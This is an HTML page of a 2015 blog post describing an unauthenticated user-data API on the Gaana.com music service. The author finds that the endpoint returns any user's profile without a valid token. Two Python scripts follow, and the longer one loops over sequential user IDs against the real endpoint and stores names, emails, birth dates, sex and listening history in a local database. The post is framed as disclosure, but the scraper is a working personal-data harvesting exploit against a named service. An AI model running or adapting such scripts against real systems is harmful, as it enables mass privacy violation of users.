<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
  <head>
    <title>An exploit on Gaana.com gave me access to their entire User Database - blag</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet" />
    <!--<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css" rel="stylesheet" />-->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" />
    <link href="http://avi.im/blag/theme/style.css" rel="stylesheet" />
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="http://avi.im/blag/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="blag Full Atom Feed" />
    <link href="http://avi.im/blag/feeds/category/code.atom.xml" type="application/atom+xml" rel="alternate" title="blag Categories Atom Feed" />
  </head>
  <body id="index" class="archive">
    <!--[if lt IE 7]>
        <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    <![endif]-->
    <nav class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="http://avi.im/blag">blag</a>
        </div>
        <div class="collapse navbar-collapse navbar-right">
          <ul class="nav navbar-nav">
            <li><a href="http://avi.im/blag/about/">About</a></li>
            <li><a href="http://avi.im/blag/contact/">Contact</a></li>
            <li><a href="http://avi.im/blag/tags.html">tags</a></li>
          </ul>
        </div>
        <!-- /.navbar-collapse -->
      </div>
    </nav>
    <div class="container">
    <section id="content" class="article content">
      <header>
        <h2 class="entry-title">
          An exploit on Gaana.com gave me access to their entire User Database
        </h2>
        
        <div class="text-muted">Tue 12 May 2015</div>
      </header>
<!-- .entry-content -->
      <div class="entry-content">
        <p>Ever since <a href="http://blog.mclov.in/path-uploads-your-entire-iphone-address-book-to-its-servers-22HGO5EiLJKhWZPKdMOgdw">Path - iPhone Address Book fiasco</a> I have developed a habit of doing MITM and checking app's internal APIs. Yesterday I was playing around with <a href="http://gaana.com">Gaana.com</a>'s <a href="https://itunes.apple.com/in/app/gaana-unlimited-bollywood/id585270521?mt=8">app</a> and I came across an internal API which gave me access to their user database. Surprisingly, it did not require any cookies, authentication, session id or anything. Anyone with an URL would have had access to Gaana's User DB. </p>
<p>I got access to following data of each user:
 - Full Name
 - Photo 
 - Email address 
 - Date of Birth
 - Sex
 - Last song they listened on Gaana</p>
<p>Following image shows my personal info on Gaana.com which was accessible to anyone. Well, here's <a href="https://archive.is/HEvUv">proof</a>. If ~Archive Today~ <a href="http://archive.is">Archive Is</a> can access the data then anyone can.</p>
<p>I also got an idea about how they are handling user account deletion. Spoiler alert, even if they have deleted your account, they still retain your profile pic. </p>
<h2>The Hack</h2>
<p>During normal session, I came across an API which was retrieving user data from Gaana's database:</p>
<div class="highlight"><pre>api.gaana.com/user.php?type=get_user_object&amp;&amp;user_id=&lt;user_id&gt;&amp;token=&lt;token&gt;
</pre></div>


<p>above API requires <code>user_id</code> of the user whose data needs to be accessed and an authentication <code>token</code> for this transaction. Now in a well designed app, the user should be able make requests only to his account and not to anyone else's. The token, may be, should linked to the user id, generated every time and should authenticate the request. The unique token per session should give access to the unique user. </p>
<p>The API call to get my info was:</p>
<div class="highlight"><pre>http://api.gaana.com/user.php?type=get_user_object&amp;&amp;user_id=11875135&amp;token=d4f9763714ad89e839605e460ef1b4556
</pre></div>


<p>My first doubt was, why there is even a <code>user_id</code> field. I am not an expert developer, but if I were designing I wouldn't include <code>user-id</code> in the API call. The <code>token</code> should be just enough. And I would regenerate it for every session or make it expire after few hours or something like that. And ofcourse, make this communication over TLS/SSL. </p>
<p>I copied the above URL and opened it in Browser and it showed my info. Without HTTPS. I have never used or logged into Gaana.com in my browser. So I assumed it's not doing any other validation and using only <code>token</code>. Though not using HTTPS was worrisome. </p>
<p>Then I incremented my <code>user_id</code> by 1 and sent GET again:</p>
<p>Then I kept on changing <code>user_id</code> and started sending GETs. It always worked. Then I thought, would it work if I change the token? </p>
<p>Well yeah, it did work. Then another try:</p>
<p>Hmm...There's something really fishy going on. What if I don't provide any <code>token</code> at all? </p>
<p>WUT! </p>
<p>All you had to was loop through <code>user_id</code> starting from 1. Following simple script </p>
<div class="highlight"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="n">api</span> <span class="o">=</span> <span class="s">&#39;http://api.gaana.com/user.php?type=get_user_object&amp;&amp;user_id={0}&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SOME_NUM</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">api</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
</pre></div>


<p>Here's the much elaborate script I used: </p>
<div class="highlight"><pre><span class="kn">import</span> <span class="nn">sqlite3</span>
<span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">date</span>

<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">peewee</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">users_data_public_api</span> <span class="o">=</span> <span class="s">&quot;http://api.gaana.com/user.php?type=get_user_object&amp;&amp;user_id={0}&amp;token=d4f9763714ad89e839605e460ef1b4556&quot;</span>


<span class="n">db</span> <span class="o">=</span> <span class="n">SqliteDatabase</span><span class="p">(</span><span class="s">&#39;gaana_users.db&#39;</span><span class="p">)</span>


<span class="k">class</span> <span class="nc">GaanaUser</span><span class="p">(</span><span class="n">Model</span><span class="p">):</span>
    <span class="n">user_id</span> <span class="o">=</span> <span class="n">IntegerField</span><span class="p">()</span>
    <span class="n">fullname</span> <span class="o">=</span> <span class="n">CharField</span><span class="p">()</span>
    <span class="n">email</span> <span class="o">=</span> <span class="n">CharField</span><span class="p">()</span>
    <span class="n">sex</span> <span class="o">=</span> <span class="n">CharField</span><span class="p">(</span><span class="n">null</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">dob</span> <span class="o">=</span> <span class="n">DateField</span><span class="p">(</span><span class="n">null</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">lastheardsong</span> <span class="o">=</span> <span class="n">CharField</span><span class="p">(</span><span class="n">null</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

    <span class="k">class</span> <span class="nc">Meta</span><span class="p">:</span>
        <span class="n">database</span> <span class="o">=</span> <span class="n">db</span>


<span class="k">def</span> <span class="nf">initialize_db</span><span class="p">():</span>
    <span class="n">db</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span>
    <span class="c"># db.create_tables([GaanaUser])</span>


<span class="k">def</span> <span class="nf">deinit</span><span class="p">():</span>
    <span class="n">db</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">get_gaana_user_data</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
    <span class="sd">&quot;&quot;&quot; Returns Gaana user data only if he has all the fields required &quot;&quot;&quot;</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">users_data_public_api</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user_id</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">&quot;got {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user_id</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="n">requests</span><span class="o">.</span><span class="n">codes</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
        <span class="n">user_data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s">&#39;users&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">user_data</span><span class="p">[</span><span class="s">&#39;email&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">None</span> <span class="ow">and</span> <span class="s">&#39;deleted@gaana.com&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">user_data</span><span class="p">[</span><span class="s">&#39;email&#39;</span><span class="p">]:</span>
            <span class="k">if</span> <span class="n">user_data</span><span class="p">[</span><span class="s">&#39;fullname&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">user_data</span><span class="p">[</span><span class="s">&#39;dob&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">user_data</span><span class="p">[</span><span class="s">&#39;dob&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span>
                        <span class="n">user_data</span><span class="p">[</span><span class="s">&#39;dob&#39;</span><span class="p">],</span> <span class="s">&quot;</span><span class="si">%d</span><span class="s">/%m/%Y&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">date</span><span class="p">()</span>
                <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
                    <span class="n">user_data</span><span class="p">[</span><span class="s">&#39;dob&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">None</span>
                <span class="k">return</span> <span class="n">user_data</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11900</span><span class="p">,</span> <span class="mi">12300</span><span class="p">):</span>
        <span class="n">user_data</span> <span class="o">=</span> <span class="n">get_gaana_user_data</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">user_data</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">&quot;putting {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="n">poor_user</span> <span class="o">=</span> <span class="n">GaanaUser</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">user_data</span><span class="p">[</span><span class="s">&#39;user_id&#39;</span><span class="p">],</span>
                                  <span class="n">fullname</span><span class="o">=</span><span class="n">user_data</span><span class="p">[</span><span class="s">&#39;fullname&#39;</span><span class="p">],</span>
                                  <span class="n">email</span><span class="o">=</span><span class="n">user_data</span><span class="p">[</span><span class="s">&#39;email&#39;</span><span class="p">],</span>
                                  <span class="n">sex</span><span class="o">=</span><span class="n">user_data</span><span class="p">[</span><span class="s">&#39;sex&#39;</span><span class="p">],</span>
                                  <span class="n">dob</span><span class="o">=</span><span class="n">user_data</span><span class="p">[</span><span class="s">&#39;dob&#39;</span><span class="p">],</span>
                                  <span class="n">lastheardsong</span><span class="o">=</span><span class="n">user_data</span><span class="p">[</span><span class="s">&#39;lastheardsong&#39;</span><span class="p">])</span>
            <span class="n">poor_user</span><span class="o">.</span><span class="n">save</span><span class="p">()</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.5</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">initialize_db</span><span class="p">()</span>
    <span class="n">main</span><span class="p">()</span>
    <span class="n">deinit</span><span class="p">()</span>
</pre></div>


<p>Lets see JS works in MD.</p>
<script data-isso="//localhost:1234/" src="localhost:1234/js/embed.min.js"></script>

<section id="isso-thread"></section>
      </div>
<!-- /.entry-content -->
      <footer class="post-info text-muted">
        <button type="button" class="btn btn-default">          
          <a href="http://avi.im/blag/category/code"><div class="fa fa-lg fa-folder-open"></div> Code</a>
        </button>
        <button type="button" class="btn btn-default">
          <a href="http://avi.im/blag/tag/hacking/"><div class="fa fa-lg fa-tag"></div> hacking</a>
        </button>
        <button type="button" class="btn btn-default">
          <a href="http://avi.im/blag/tag/python/"><div class="fa fa-lg fa-tag"></div> python</a>
        </button>
      </footer>
      <!-- /.post-info -->
    </section>
    </div>
    <footer class="footer">
      <div class="container">
        <p class="footer-text">&copy; <a href="http://avi.im/blag">blag</a> powered by <a href="http://getpelican.com/">pelican</a> and Skyfall</p>
      </div>
    </footer>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
  </body>
</html>